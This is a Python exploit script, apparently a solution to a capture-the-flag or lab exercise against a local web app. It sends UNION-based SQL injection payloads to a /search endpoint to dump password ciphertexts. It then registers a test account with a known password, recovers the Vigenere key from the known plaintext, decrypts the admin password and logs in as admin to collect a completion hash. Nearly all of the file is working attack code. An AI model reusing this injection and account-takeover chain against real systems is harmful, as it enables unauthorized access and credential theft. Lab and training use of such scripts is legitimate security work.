import requests
import re

# Extract admin's ciphertext password from /search
def get_admin_ciphertext():
    target_url = "http://localhost:8080/search"
    
    payload = "\" UNION SELECT password_hash FROM members WHERE username='admin'--"
    data = {"name": payload}
    
    try:
        response = requests.post(target_url, data=data)
        
        # Look for the ciphertext pattern (all uppercase letters)
        cipher_pattern = r'([A-Z]{8,})' 
        matches = re.findall(cipher_pattern, response.text)
        
        for match in matches:
            if len(match) > 7:
                print(f"Admin ciphertext: {match}")
                return match
        
        print("Could not find admin ciphertext")
        return None
        
    except Exception as e:
        print(f"{e}")
        return None

# Register a test account with known password to extract the key
def register_test_account(admin_ciphertext_length):
    register_url = "http://localhost:8080/register"
    
    # Create a test password of same length as admin's, all 'A's
    test_password = "A" * admin_ciphertext_length
    test_username = f"testuser_{admin_ciphertext_length}"
    test_name = "Test User"
    
    register_data = {
        "username": test_username,
        "name": test_name,
        "password": test_password
    }
    
    try:
        response = requests.post(register_url, data=register_data)
        if response.status_code == 200:
            print(f"test account username: {test_username}")
            return test_username
        else:
            print(f"Registration failed: {response.status_code}")
            return None
            
    except Exception as e:
        print(f"{e}")
        return None

# Get test account's ciphertext
def get_test_ciphertext(test_username, admin_ciphertext):
    target_url = "http://localhost:8080/search"
    
    payload = f"\" UNION SELECT password_hash FROM members WHERE username='{test_username}'--"
    data = {"name": payload}
    
    try:
        response = requests.post(target_url, data=data)
        
        # Look for the ciphertext pattern (all uppercase letters)
        cipher_pattern = r'([A-Z]{8,})'
        matches = re.findall(cipher_pattern, response.text)
        
        for match in matches:
            if len(match) > 7 and match is not admin_ciphertext: # Make sure this ciphertext is the other one, not the admin's
                print(f"Test ciphertext: {match}")
                return match
        
        print("Could not find test ciphertext")
        return None
        
    except Exception as e:
        print(f"{e}")
        return None

# Do vigenere cipher decryption with the derived key
def vigenere_decrypt(ciphertext, key):
    plaintext = ""
    
    for i in range(len(ciphertext)):
        # characters to 0-25 range (A=0, Z=25)
        c_char = ord(ciphertext[i]) - ord('A')
        k_char = ord(key[i]) - ord('A')
        
        # P = (C - K) mod 26
        p_char = (c_char - k_char) % 26
        
        # back to character
        plaintext += chr(p_char + ord('A'))
    
    return plaintext

# Derives the vigenere key using the known plaintext-ciphertext pair
def derive_key_from_known_plaintext(test_ciphertext, test_password):
    key = ""
    
    for i in range(len(test_ciphertext)):
        # characters to 0-25 range (a is 0, z is 25)
        c_char = ord(test_ciphertext[i]) - ord('A')
        p_char = ord(test_password[i]) - ord('A')
        
        # K = (C - P) mod 26
        k_char = (c_char - p_char) % 26
        
        key += chr(k_char + ord('A'))
    
    return key

# Login as admin with true admin pswd
def login_as_admin(password):
    login_url = "http://localhost:8080/login"
    name = "om khadka"
    
    login_data = {
        "username": "admin",
        "name": name,
        "password": password
    }
    
    try:
        response = requests.post(login_url, data=login_data)
        
        if "ACCESS GRANTED" in response.text:
            hash_match = re.search(r'<h2>([a-f0-9]{64})</h2>', response.text)
            if hash_match:
                access_hash = hash_match.group(1)
                print(f"Completion Hash: {access_hash}")
                return access_hash
        else:
            print("Login failed")
            return None
            
    except Exception as e:
        print(f"{e}")
        return None

def main():
    admin_ciphertext = get_admin_ciphertext()
    
    if not admin_ciphertext:
        print("Failed to get admin ciphertext")
        return
    
    admin_password_length = len(admin_ciphertext)
    print(f"Admin ciphertext length: {admin_password_length}")
    
    test_username = register_test_account(admin_password_length)
    
    if not test_username:
        print("Failed to register test account")
        return
    
    test_ciphertext = get_test_ciphertext(test_username, admin_ciphertext)
    
    if not test_ciphertext:
        print("Failed to extract test ciphertext")
        return
    
    test_password = "A" * admin_password_length
    derived_key = derive_key_from_known_plaintext(test_ciphertext, test_password)
    print(f"Derived key: {derived_key}")
    
    admin_password = vigenere_decrypt(admin_ciphertext, derived_key)
    print(f"Admin plaintext password: {admin_password}")
    
    completion_hash = login_as_admin(admin_password)
    
    if completion_hash:
        print("attack success")
        print(f"Admin Ciphertext: {admin_ciphertext}")
        print(f"Derived Key: {derived_key}")
        print(f"Admin Password: {admin_password}")
        print(f"Completion Hash: {completion_hash}")
    else:
        print("Failed to login as admin")

if __name__ == "__main__":
    main() 